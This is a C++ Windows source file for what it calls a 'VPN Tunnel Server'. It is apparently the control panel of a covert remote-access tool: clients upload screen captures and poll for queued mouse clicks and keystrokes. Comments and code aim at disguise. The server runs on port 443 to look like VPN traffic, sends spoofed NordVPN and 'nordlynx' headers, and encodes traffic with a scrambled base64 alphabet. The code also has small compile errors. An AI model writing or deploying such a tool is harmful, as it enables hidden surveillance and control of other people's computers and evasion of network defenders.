/*
 * VPN Tunnel GUI Server - Modernized Edition with Double-Click Support
 * 
 * Dependencies (header-only libraries):
 * - cpp-httplib: https://github.com/yhirose/cpp-httplib
 * - nlohmann/json: https://github.com/nlohmann/json
 * 
 * Download these header files:
 * - httplib.h (place in project directory)
 * - nlohmann/json.hpp (create nlohmann/ folder and place json.hpp inside)
 * 
 * Build command:
 * g++ -std=c++17 -O2 -DWIN32_LEAN_AND_MEAN server.cpp -o server.exe -luser32 -lgdi32 -lcomctl32 -lws2_32 -static
 * 
 * VPN Port Strategy:
 * - Port 443 (HTTPS): Best disguise - VPN control/management traffic
 *   Perfect for our HTTP-based endpoints (/vpn/auth, /vpn/control/, etc.)
 * - Port 1194 (OpenVPN): Alternative - standard OpenVPN port  
 * - Port 500/4500 (IKEv2): NordVPN also uses these for IKEv2 protocol
 * - Avoid 8080: Too obvious as alt-HTTP, not VPN-related
 */

#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <unordered_map>
#include <mutex>
#include <memory>
#include <functional>
#include <optional>
#include <fstream>
#include <iomanip>

// Modern HTTP server (cpp-httplib - header-only)
#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "httplib.h"

// Modern JSON library (nlohmann/json - header-only)  
#include "nlohmann/json.hpp"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <commctrl.h>
#include <windowsx.h>
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")

using json = nlohmann::json;
using namespace std::chrono_literals;

// Window class names
#define WC_MAIN_WINDOW L"VPNTunnelServer"
#define WC_VIEWER_WINDOW L"VPNTunnelViewer"

// Control IDs
#define ID_CLIENT_LIST 1001
#define ID_REFRESH_BTN 1002
#define ID_MODE_TOGGLE 1003

// Custom messages
#define WM_UPDATE_CLIENT_LIST (WM_USER + 1)
#define WM_NEW_SCREEN_DATA (WM_USER + 2)

// Configuration management - AUTO DEFAULTS TO PORT 443 FOR DOUBLE-CLICK
struct ServerConfig {
    int port = 443;  // HTTPS port - appears as VPN management/control traffic
    std::string log_level = "INFO";
    bool auto_refresh = true;
    int refresh_interval_ms = 5000;
    
    void load(const std::string& filename = "server_config.json") {
        std::ifstream file(filename);
        if (file.is_open()) {
            json config;
            file >> config;
            port = config.value("port", port);
            log_level = config.value("log_level", log_level);
            auto_refresh = config.value("auto_refresh", auto_refresh);
            refresh_interval_ms = config.value("refresh_interval_ms", refresh_interval_ms);
        }
    }
    
    void save(const std::string& filename = "server_config.json") const {
        json config;
        config["port"] = port;
        config["log_level"] = log_level;
        config["auto_refresh"] = auto_refresh;
        config["refresh_interval_ms"] = refresh_interval_ms;
        
        std::ofstream file(filename);
        file << config.dump(2);
    }
};

// Modern logging system
class Logger {
public:
    enum Level { DEBUG, INFO, WARN, ERROR };
    
    static void log(Level level, const std::string& message) {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        std::lock_guard<std::mutex> lock(log_mutex_);
        std::cout << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] "
                  << level_strings_[level] << ": " << message << std::endl;
    }
    
    static void info(const std::string& msg) { log(INFO, msg); }
    static void warn(const std::string& msg) { log(WARN, msg); }
    static void error(const std::string& msg) { log(ERROR, msg); }
    static void debug(const std::string& msg) { log(DEBUG, msg); }
    
private:
    static std::mutex log_mutex_;
    static const char* level_strings_[4];
};

std::mutex Logger::log_mutex_;
const char* Logger::level_strings_[4] = {"DEBUG", "INFO", "WARN", "ERROR"};

// Modern client session management
class ClientSession {
public:
    std::string id;
    std::string client_ip;
    std::chrono::system_clock::time_point last_seen;
    bool active = false;
    int width = 0, height = 0;
    std::vector<uint8_t> screen_buffer;
    std::queue<std::string> pending_inputs;
    HWND viewer_window = nullptr;
    bool is_connected = false;
    
    // Thread-safe input queueing
    void queueInput(const std::string& command) {
        std::lock_guard<std::mutex> lock(input_mutex_);
        pending_inputs.push(command);
        Logger::debug("Queued input for " + id + ": " + command);
    }
    
    // Thread-safe input retrieval
    std::optional<std::string> getNextInput() {
        std::lock_guard<std::mutex> lock(input_mutex_);
        if (pending_inputs.empty()) {
            return std::nullopt;
        }
        
        std::string command = pending_inputs.front();
        pending_inputs.pop();
        return command;
    }
    
    // Update screen data with automatic change detection
    bool updateScreen(const std::vector<uint8_t>& new_data, int w, int h) {
        std::lock_guard<std::mutex> lock(screen_mutex_);
        
        bool changed = (width != w || height != h || screen_buffer != new_data);
        if (changed) {
            width = w;
            height = h;
            screen_buffer = new_data;
            last_seen = std::chrono::system_clock::now();
            Logger::debug("Screen updated for " + id + ": " + std::to_string(w) + "x" + std::to_string(h));
        }
        
        return changed;
    }
    
    // Thread-safe screen data access
    std::tuple<std::vector<uint8_t>, int, int> getScreenData() const {
        std::lock_guard<std::mutex> lock(screen_mutex_);
        return {screen_buffer, width, height};
    }
    
private:
    mutable std::mutex input_mutex_;
    mutable std::mutex screen_mutex_;
};

// Modern client manager with smart pointers
class ClientManager {
public:
    using ClientPtr = std::shared_ptr<ClientSession>;
    
    ClientPtr createSession(const std::string& client_ip) {
        std::string session_id = generateSessionId();
        auto client = std::make_shared<ClientSession>();
        client->id = session_id;
        client->client_ip = client_ip;
        client->last_seen = std::chrono::system_clock::now();
        client->active = true;
        
        std::lock_guard<std::mutex> lock(clients_mutex_);
        clients_[session_id] = client;
        
        Logger::info("New session created: " + session_id + " from " + client_ip);
        return client;
    }
    
    ClientPtr getSession(const std::string& session_id) {
        std::lock_guard<std::mutex> lock(clients_mutex_);
        auto it = clients_.find(session_id);
        return (it != clients_.end()) ? it->second : nullptr;
    }
    
    std::vector<ClientPtr> getAllSessions() {
        std::lock_guard<std::mutex> lock(clients_mutex_);
        std::vector<ClientPtr> result;
        for (const auto& pair : clients_) {
            if (pair.second->active) {
                result.push_back(pair.second);
            }
        }
        return result;
    }
    
    void removeInactiveSessions(std::chrono::seconds timeout = 300s) {
        auto now = std::chrono::system_clock::now();
        std::lock_guard<std::mutex> lock(clients_mutex_);
        
        auto it = clients_.begin();
        while (it != clients_.end()) {
            if (now - it->second->last_seen > timeout) {
                Logger::info("Removing inactive session: " + it->first);
                it = clients_.erase(it);
            } else {
                ++it;
            }
        }
    }
    
private:
    std::unordered_map<std::string, ClientPtr> clients_;
    std::mutex clients_mutex_;
    
    std::string generateSessionId() {
        static const char chars[] = "0123456789abcdef";
        std::string result(16, '0');
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        for (char& c : result) {
            c = chars[dis(gen)];
        }
        
        return result;
    }
};

// CRITICAL: Low-level client compatibility layer
// This ensures clients receive EXACTLY the same data format
class ClientProtocolHandler {
public:
    // Generate response that matches client's expectations exactly
    static std::string createAuthResponse(const std::string& session_id) {
        // Must match client's expected JSON format exactly
        json response;
        response["session"] = session_id;
        response["status"] = "authenticated";
        return response.dump();
    }
    
    static std::string createControlResponse(const std::string& input_command) {
        if (input_command.empty()) {
            return "{}"; // Empty response when no commands
        }
        
        // Encode using same algorithm as client expects
        std::string encoded = encodeForClient(input_command);
        
        json response;
        response["input"] = encoded;
        return response.dump();
    }
    
    // CRITICAL: This must match the client's decoder exactly
    static std::string encodeForClient(const std::string& input) {
        static const char chars[] = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";
        
        std::string result;
        int val = 0, valb = -6;
        
        for (unsigned char c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) {
            result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        }
        while (result.size() % 4) {
            result.push_back('=');
        }
        
        return result;
    }
    
    // CRITICAL: This must match the client's encoder exactly  
    static std::vector<uint8_t> decodeFromClient(const std::string& input) {
        std::vector<int> T(256, -1);
        const char chars[] = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::vector<uint8_t> result;
        int val = 0, valb = -8;
        
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        
        return result;
    }
    
    // CRITICAL: RLE decompression must match client exactly
    static std::vector<uint8_t> decompressRLE(const std::vector<uint8_t>& compressed) {
        std::vector<uint8_t> result;
        
        for (size_t i = 0; i < compressed.size(); ) {
            if (i + 2 < compressed.size() && compressed[i] == 0xFF) {
                uint8_t count = compressed[i + 1];
                uint8_t value = compressed[i + 2];
                for (int j = 0; j < count; j++) {
                    result.push_back(value);
                }
                i += 3;
            } else {
                result.push_back(compressed[i]);
                i++;
            }
        }
        
        return result;
    }
    
    // Extract tunnel data (must match client wrapper format)
    static std::string extractTunnelData(const std::string& wrapped) {
        if (wrapped.length() < 12) return "";
        
        size_t start = 12; // Skip protocol header + session fragment
        size_t end = wrapped.find("\xFF\xFF"); // Find footer
        if (end == std::string::npos) end = wrapped.length();
        
        return wrapped.substr(start, end - start);
    }
};

// Global instances
ServerConfig g_config;
std::unique_ptr<ClientManager> g_clientManager;
std::unique_ptr<httplib::Server> g_httpServer;

// Modern HTTP server setup with clean handlers
class VPNTunnelServer {
public:
    VPNTunnelServer(int port) : port_(port) {
        g_clientManager = std::make_unique<ClientManager>();
        setupHttpHandlers();
        Logger::info("VPN Tunnel Server initialized on port " + std::to_string(port));
    }
    
    void start() {
        server_thread_ = std::thread([this]() {
            Logger::info("Starting HTTP server on port " + std::to_string(port_));
            g_httpServer->listen("0.0.0.0", port_);
        });
        
        cleanup_thread_ = std::thread([this]() {
            while (running_) {
                std::this_thread::sleep_for(30s);
                g_clientManager->removeInactiveSessions();
            }
        });
    }
    
    void stop() {
        running_ = false;
        if (g_httpServer) {
            g_httpServer->stop();
        }
        if (server_thread_.joinable()) {
            server_thread_.join();
        }
        if (cleanup_thread_.joinable()) {
            cleanup_thread_.join();
        }
    }
    
private:
    int port_;
    std::thread server_thread_;
    std::thread cleanup_thread_;
    std::atomic<bool> running_{true};
    
    void setupHttpHandlers() {
        g_httpServer = std::make_unique<httplib::Server>();
        
        // VPN authentication endpoint - creates new session
        g_httpServer->Get("/vpn/auth", [](const httplib::Request& req, httplib::Response& res) {
            auto client = g_clientManager->createSession(req.get_header_value("X-Forwarded-For", "unknown"));
            
            // CRITICAL: Response must match client expectations exactly
            res.set_content(ClientProtocolHandler::createAuthResponse(client->id), "application/json");
            res.set_header("Server", "nordvpn-gateway/2.1.0");
            
            Logger::info("Auth request from " + client->client_ip + " -> session " + client->id);
            
            // Notify GUI to refresh client list
            if (g_hMainWnd) {
                PostMessage(g_hMainWnd, WM_UPDATE_CLIENT_LIST, 0, 0);
            }
        });
        
        // VPN tunnel data endpoint - receives screen captures
        g_httpServer->Post(R"(/vpn/tunnel/(.+))", [](const httplib::Request& req, httplib::Response& res, const httplib::Match& match) {
            std::string session_id = match[1];
            auto client = g_clientManager->getSession(session_id);
            
            if (!client) {
                res.status = 404;
                return;
            }
            
            try {
                // Extract tunnel data (must match client wrapper format)
                std::string tunnel_data = ClientProtocolHandler::extractTunnelData(req.body);
                json data = json::parse(tunnel_data);
                
                int width = data["width"];
                int height = data["height"];
                std::string encoded_screen = data["data"];
                
                // Decode and decompress using exact client algorithms
                auto decoded = ClientProtocolHandler::decodeFromClient(encoded_screen);
                auto screen_data = ClientProtocolHandler::decompressRLE(decoded);
                
                // Update client screen data
                bool changed = client->updateScreen(screen_data, width, height);
                
                if (changed && client->viewer_window && IsWindow(client->viewer_window)) {
                    // Update viewer window
                    PostMessage(client->viewer_window, WM_NEW_SCREEN_DATA, 0, 0);
                }
                
                res.set_content("OK", "text/plain");
                
            } catch (const std::exception& e) {
                Logger::error("Failed to process screen data: " + std::string(e.what()));
                res.status = 400;
            }
        });
        
        // VPN control endpoint - sends input commands
        g_httpServer->Get(R"(/vpn/control/(.+))", [](const httplib::Request& req, httplib::Response& res, const httplib::Match& match) {
            std::string session_id = match[1];
            auto client = g_clientManager->getSession(session_id);
            
            if (!client) {
                res.status = 404;
                return;
            }
            
            auto input_command = client->getNextInput();
            
            // CRITICAL: Response format must match client expectations exactly
            std::string response_body = ClientProtocolHandler::createControlResponse(
                input_command.value_or("")
            );
            
            res.set_content(response_body, "application/json");
            res.set_header("Server", "nordvpn-gateway/2.1.0");
        });
        
        // Add CORS and VPN-style headers to all responses
        g_httpServer->set_post_routing_handler([](const httplib::Request& req, httplib::Response& res) {
            res.set_header("Access-Control-Allow-Origin", "*");
            res.set_header("X-VPN-Gateway", "nordlynx");
            res.set_header("X-Server-Region", "us-east");
        });
        
        Logger::info("HTTP handlers configured");
    }
};

// Global GUI variables  
HINSTANCE g_hInstance = nullptr;
HWND g_hMainWnd = nullptr;
HWND g_hClientList = nullptr;
std::unique_ptr<VPNTunnelServer> g_vpnServer;

// Remote desktop viewer window data (unchanged - GUI only)
struct ViewerWindowData {
    std::string session_id;
    HBITMAP screen_bitmap;
    bool split_mode;
    int remote_width;
    int remote_height;
};

// Modern GUI helper functions
void UpdateClientList() {
    if (!g_hClientList) return;
    
    ListView_DeleteAllItems(g_hClientList);
    
    auto clients = g_clientManager->getAllSessions();
    int index = 0;
    
    for (const auto& client : clients) {
        LVITEMA item = {0};
        item.mask = LVIF_TEXT | LVIF_PARAM;
        item.iItem = index++;
        item.iSubItem = 0;
        item.pszText = const_cast<char*>(client->client_ip.c_str());
        item.lParam = reinterpret_cast<LPARAM>(client.get());
        
        int itemIndex = ListView_InsertItem(g_hClientList, &item);
        
        ListView_SetItemText(g_hClientList, itemIndex, 1, const_cast<char*>(client->id.c_str()));
        
        auto [screen_data, width, height] = client->getScreenData();
        char resolution[32];
        sprintf_s(resolution, sizeof(resolution), "%dx%d", width, height);
        ListView_SetItemText(g_hClientList, itemIndex, 2, resolution);
        
        ListView_SetItemText(g_hClientList, itemIndex, 3, client->is_connected ? "Connected" : "Idle");
    }
    
    Logger::debug("Client list updated with " + std::to_string(clients.size()) + " clients");
}

HBITMAP CreateScreenBitmap(const std::vector<uint8_t>& screen_data, int width, int height) {
    if (screen_data.empty() || width == 0 || height == 0) return nullptr;
    
    HDC hdc = GetDC(nullptr);
    
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    void* pBits;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, nullptr, 0);
    
    if (hBitmap && pBits) {
        size_t expected_size = static_cast<size_t>(width) * height * 3;
        size_t copy_size = std::min(screen_data.size(), expected_size);
        memcpy(pBits, screen_data.data(), copy_size);
    }
    
    ReleaseDC(nullptr, hdc);
    return hBitmap;
}

void OpenViewerWindow(const std::string& session_id) {
    auto client = g_clientManager->getSession(session_id);
    if (!client) {
        Logger::warn("Attempted to open viewer for non-existent session: " + session_id);
        return;
    }
    
    // Check if window already exists
    if (client->viewer_window && IsWindow(client->viewer_window)) {
        SetForegroundWindow(client->viewer_window);
        return;
    }
    
    // Create new viewer window data
    auto data = std::make_unique<ViewerWindowData>();
    data->session_id = session_id;
    data->screen_bitmap = nullptr;
    data->split_mode = false;
    
    auto [screen_data, width, height] = client->getScreenData();
    data->remote_width = width;
    data->remote_height = height;
    
    char title[256];
    sprintf_s(title, sizeof(title), "Remote Desktop - %s (%s)", 
             client->client_ip.c_str(), session_id.c_str());
    
    HWND hViewer = CreateWindowExA(
        0,
        "VPNTunnelViewer",
        title,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 1024, 768,
        nullptr, nullptr, g_hInstance, data.release() // Transfer ownership
    );
    
    if (hViewer) {
        client->viewer_window = hViewer;
        client->is_connected = true;
        ShowWindow(hViewer, SW_SHOW);
        UpdateWindow(hViewer);
        
        // Update screen if we already have data
        if (!screen_data.empty()) {
            ViewerWindowData* window_data = (ViewerWindowData*)GetWindowLongPtr(hViewer, GWLP_USERDATA);
            if (window_data) {
                window_data->screen_bitmap = CreateScreenBitmap(screen_data, width, height);
                InvalidateRect(hViewer, nullptr, TRUE);
            }
        }
        
        Logger::info("Opened viewer window for session " + session_id);
    }
}

// Remote desktop viewer window procedure (modernized)
LRESULT CALLBACK ViewerWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ViewerWindowData* data = (ViewerWindowData*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    
    switch (uMsg) {
    case WM_CREATE: {
        CREATESTRUCT* cs = (CREATESTRUCT*)lParam;
        data = (ViewerWindowData*)cs->lpCreateParams;
        SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)data);
        
        // Create mode toggle button
        CreateWindowW(L"BUTTON", L"⚏", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                     0, 0, 30, 25, hwnd, (HMENU)ID_MODE_TOGGLE, g_hInstance, nullptr);
        
        Logger::debug("Viewer window created for session " + data->session_id);
        return 0;
    }
    
    case WM_SIZE: {
        // Reposition mode toggle button
        HWND hToggle = GetDlgItem(hwnd, ID_MODE_TOGGLE);
        if (hToggle) {
            RECT clientRect;
            GetClientRect(hwnd, &clientRect);
            SetWindowPos(hToggle, HWND_TOP, clientRect.right - 35, 5, 30, 25, SWP_NOZORDER);
        }
        
        InvalidateRect(hwnd, nullptr, TRUE);
        return 0;
    }
    
    case WM_COMMAND: {
        if (LOWORD(wParam) == ID_MODE_TOGGLE && data) {
            data->split_mode = !data->split_mode;
            InvalidateRect(hwnd, nullptr, TRUE);
            Logger::debug("Toggled split mode for session " + data->session_id + ": " + 
                         (data->split_mode ? "ON" : "OFF"));
        }
        return 0;
    }
    
    case WM_NEW_SCREEN_DATA: {
        if (data) {
            auto client = g_clientManager->getSession(data->session_id);
            if (client) {
                auto [screen_data, width, height] = client->getScreenData();
                
                if (data->screen_bitmap) {
                    DeleteObject(data->screen_bitmap);
                }
                
                data->screen_bitmap = CreateScreenBitmap(screen_data, width, height);
                data->remote_width = width;
                data->remote_height = height;
                
                InvalidateRect(hwnd, nullptr, FALSE);
            }
        }
        return 0;
    }
    
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        
        RECT clientRect;
        GetClientRect(hwnd, &clientRect);
        
        if (data && data->screen_bitmap) {
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, data->screen_bitmap);
            
            BITMAP bm;
            GetObject(data->screen_bitmap, sizeof(bm), &bm);
            
            if (data->split_mode) {
                // Split mode: left half blank, right half remote screen
                int halfWidth = clientRect.right / 2;
                
                // Fill left half with gray
                RECT leftRect = {0, 0, halfWidth, clientRect.bottom};
                FillRect(hdc, &leftRect, (HBRUSH)(COLOR_BTNFACE + 1));
                
                // Draw text in left panel
                DrawTextA(hdc, "Tool Panel\n(Coming Soon)", -1, &leftRect, 
                         DT_CENTER | DT_VCENTER | DT_WORDBREAK);
                
                // Scale remote screen to right half
                StretchBlt(hdc, halfWidth, 0, halfWidth, clientRect.bottom,
                          hdcMem, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
            } else {
                // Full mode: entire window shows remote screen
                StretchBlt(hdc, 0, 0, clientRect.right, clientRect.bottom,
                          hdcMem, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
            }
            
            SelectObject(hdcMem, hOldBitmap);
            DeleteDC(hdcMem);
        } else {
            // No screen data - show waiting message
            FillRect(hdc, &clientRect, (HBRUSH)(COLOR_WINDOW + 1));
            
            std::string status = data ? 
                "Connecting to " + data->session_id + "..." : 
                "No connection";
            
            DrawTextA(hdc, status.c_str(), -1, &clientRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        }
        
        EndPaint(hwnd, &ps);
        return 0;
    }
    
    case WM_LBUTTONDOWN: {
        if (data && data->screen_bitmap) {
            auto client = g_clientManager->getSession(data->session_id);
            if (!client) return 0;
            
            RECT clientRect;
            GetClientRect(hwnd, &clientRect);
            
            int x = LOWORD(lParam);
            int y = HIWORD(lParam);
            
            if (data->split_mode) {
                // Adjust coordinates for split mode (only right half is active)
                int halfWidth = clientRect.right / 2;
                if (x >= halfWidth) {
                    x = ((x - halfWidth) * data->remote_width) / halfWidth;
                    y = (y * data->remote_height) / clientRect.bottom;
                } else {
                    return 0; // Click in left panel, ignore
                }
            } else {
                // Full mode coordinates
                x = (x * data->remote_width) / clientRect.right;
                y = (y * data->remote_height) / clientRect.bottom;
            }
            
            std::string command = "click:" + std::to_string(x) + ":" + std::to_string(y);
            client->queueInput(command);
        }
        return 0;
    }
    
    case WM_RBUTTONDOWN: {
        if (data && data->screen_bitmap) {
            auto client = g_clientManager->getSession(data->session_id);
            if (!client) return 0;
            
            RECT clientRect;
            GetClientRect(hwnd, &clientRect);
            
            int x = LOWORD(lParam);
            int y = HIWORD(lParam);
            
            if (data->split_mode) {
                int halfWidth = clientRect.right / 2;
                if (x >= halfWidth) {
                    x = ((x - halfWidth) * data->remote_width) / halfWidth;
                    y = (y * data->remote_height) / clientRect.bottom;
                } else {
                    return 0;
                }
            } else {
                x = (x * data->remote_width) / clientRect.right;
                y = (y * data->remote_height) / clientRect.bottom;
            }
            
            std::string command = "rightclick:" + std::to_string(x) + ":" + std::to_string(y);
            client->queueInput(command);
        }
        return 0;
    }
    
    case WM_CHAR: {
        if (data) {
            auto client = g_clientManager->getSession(data->session_id);
            if (!client) return 0;
            
            std::string command;
            if (wParam == VK_RETURN) {
                command = "key:ENTER";
            } else if (wParam == VK_ESCAPE) {
                command = "key:ESCAPE";
            } else if (wParam >= 32 && wParam < 127) {
                command = "key:" + std::string(1, (char)wParam);
            } else {
                return 0;
            }
            
            client->queueInput(command);
        }
        return 0;
    }
    
    case WM_CLOSE: {
        if (data) {
            // Mark client as disconnected
            auto client = g_clientManager->getSession(data->session_id);
            if (client) {
                client->viewer_window = nullptr;
                client->is_connected = false;
                Logger::info("Viewer window closed for session " + data->session_id);
            }
            
            if (data->screen_bitmap) {
                DeleteObject(data->screen_bitmap);
            }
            delete data;
        }
        DestroyWindow(hwnd);
        return 0;
    }
    
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

// Main window procedure (modernized)
LRESULT CALLBACK MainWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        // Initialize common controls
        InitCommonControls();
        
        // Create refresh button
        CreateWindowW(L"BUTTON", L"Refresh", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                     10, 10, 80, 30, hwnd, (HMENU)ID_REFRESH_BTN, g_hInstance, nullptr);
        
        // Create client list view
        g_hClientList = CreateWindowW(WC_LISTVIEW, L"", 
                                     WS_VISIBLE | WS_CHILD | WS_BORDER | LVS_REPORT | LVS_SINGLESEL,
                                     10, 50, 600, 300, hwnd, (HMENU)ID_CLIENT_LIST, g_hInstance, nullptr);
        
        // Set up list view columns
        LVCOLUMNA col = {0};
        col.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
        
        col.pszText = "Client IP";
        col.cx = 120;
        col.iSubItem = 0;
        ListView_InsertColumn(g_hClientList, 0, &col);
        
        col.pszText = "Session ID";
        col.cx = 140;
        col.iSubItem = 1;
        ListView_InsertColumn(g_hClientList, 1, &col);
        
        col.pszText = "Resolution";
        col.cx = 100;
        col.iSubItem = 2;
        ListView_InsertColumn(g_hClientList, 2, &col);
        
        col.pszText = "Status";
        col.cx = 80;
        col.iSubItem = 3;
        ListView_InsertColumn(g_hClientList, 3, &col);
        
        // Enable full row select
        ListView_SetExtendedListViewStyle(g_hClientList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        
        // Set initial window title
        SetWindowTextA(hwnd, "VPN Tunnel Server - Initializing...");
        
        // Start auto-refresh timer if enabled
        if (g_config.auto_refresh) {
            SetTimer(hwnd, 1, g_config.refresh_interval_ms, nullptr);
        }
        
        return 0;
    }
    
    case WM_SIZE: {
        RECT clientRect;
        GetClientRect(hwnd, &clientRect);
        
        // Resize list view
        if (g_hClientList) {
            SetWindowPos(g_hClientList, nullptr, 10, 50, 
                        clientRect.right - 20, clientRect.bottom - 60, SWP_NOZORDER);
        }
        return 0;
    }
    
    case WM_TIMER: {
        if (wParam == 1) { // Auto-refresh timer
            UpdateClientList();
        }
        return 0;
    }
    
    case WM_COMMAND: {
        if (LOWORD(wParam) == ID_REFRESH_BTN) {
            UpdateClientList();
            Logger::info("Manual client list refresh requested");
        }
        return 0;
    }
    
    case WM_NOTIFY: {
        LPNMHDR pnmh = (LPNMHDR)lParam;
        if (pnmh->idFrom == ID_CLIENT_LIST && pnmh->code == NM_DBLCLK) {
            int selected = ListView_GetNextItem(g_hClientList, -1, LVNI_SELECTED);
            if (selected != -1) {
                char session_id[64];
                ListView_GetItemText(g_hClientList, selected, 1, session_id, sizeof(session_id));
                OpenViewerWindow(std::string(session_id));
            }
        }
        return 0;
    }
    
    case WM_UPDATE_CLIENT_LIST: {
        UpdateClientList();
        return 0;
    }
    
    case WM_DESTROY:
        if (g_vpnServer) {
            g_vpnServer->stop();
        }
        PostQuitMessage(0);
        return 0;
        
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

// NEW: Double-click functionality - Auto-start on port 443
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    g_hInstance = hInstance;
    
    try {
        // Load configuration
        g_config.load();
        
        // DOUBLE-CLICK MODE: If no command line arguments, auto-use port 443
        if (strlen(lpCmdLine) == 0) {
            g_config.port = 443;  // Force port 443 for VPN disguise when double-clicked
            Logger::info("Double-click mode: Auto-starting on VPN port 443");
        } else {
            // Parse command line for port override
            int port = atoi(lpCmdLine);
            if (port > 0 && port < 65536) {
                g_config.port = port;
                Logger::info("Port override from command line: " + std::to_string(port));
            } else {
                Logger::warn("Invalid port specified, using default 443");
                g_config.port = 443;
            }
        }
        
        // Initialize client manager
        g_clientManager = std::make_unique<ClientManager>();
        
        // Register main window class
        WNDCLASSW wc = {0};
        wc.lpfnWndProc = MainWindowProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = WC_MAIN_WINDOW;
        wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
        
        if (!RegisterClassW(&wc)) {
            Logger::error("Failed to register main window class");
            return 1;
        }
        
        // Register viewer window class
        WNDCLASSW vc = {0};
        vc.lpfnWndProc = ViewerWindowProc;
        vc.hInstance = hInstance;
        vc.lpszClassName = WC_VIEWER_WINDOW;
        vc.hCursor = LoadCursor(nullptr, IDC_ARROW);
        vc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        vc.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
        
        if (!RegisterClassW(&vc)) {
            Logger::error("Failed to register viewer window class");
            return 1;
        }
        
        // Create main window with port info in title
        char windowTitle[256];
        sprintf_s(windowTitle, sizeof(windowTitle), "VPN Tunnel Server - Port %d", g_config.port);
        
        g_hMainWnd = CreateWindowA(
            "VPNTunnelServer",
            windowTitle,
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, 640, 400,
            nullptr, nullptr, hInstance, nullptr
        );
        
        if (!g_hMainWnd) {
            Logger::error("Failed to create main window");
            return 1;
        }
        
        ShowWindow(g_hMainWnd, nCmdShow);
        UpdateWindow(g_hMainWnd);
        
        // Start VPN tunnel server
        g_vpnServer = std::make_unique<VPNTunnelServer>(g_config.port);
        g_vpnServer->start();
        
        // DOUBLE-CLICK MODE: Show startup notification
        if (strlen(lpCmdLine) == 0) {
            char startupMsg[512];
            sprintf_s(startupMsg, sizeof(startupMsg), 
                     "VPN Tunnel Server started successfully!\n\n"
                     "Listening on port: %d (VPN Management Port)\n"
                     "Ready to accept client connections.\n\n"
                     "Instructions:\n"
                     "• Clients will appear in the list below\n"
                     "• Double-click any client to view their desktop\n"
                     "• Use the ⚏ button to toggle split-screen mode",
                     g_config.port);
            
            MessageBoxA(g_hMainWnd, startupMsg, "VPN Server Ready", MB_OK | MB_ICONINFORMATION);
        }
        
        Logger::info("VPN Tunnel Server GUI started successfully on port " + std::to_string(g_config.port));
        
        // Message loop
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
        // Save configuration on exit
        g_config.save();
        Logger::info("Configuration saved on exit");
        
        return 0;
        
    } catch (const std::exception& e) {
        Logger::error("Fatal error: " + std::string(e.what()));
        MessageBoxA(nullptr, e.what(), "VPN Tunnel Server Error", MB_OK | MB_ICONERROR);
        return 1;
    }
}